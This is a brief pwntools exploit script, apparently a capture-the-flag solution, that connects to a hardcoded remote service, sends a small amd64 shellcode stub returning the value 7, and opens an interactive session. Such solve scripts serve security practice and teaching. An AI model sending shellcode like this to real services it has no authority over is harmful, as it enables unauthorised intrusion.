#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

p=remote('157.245.88.100', 7778)
sc=asm('xor rax,rax\n mov al,7\nret\n')
p.sendline(sc)

p.interactive()
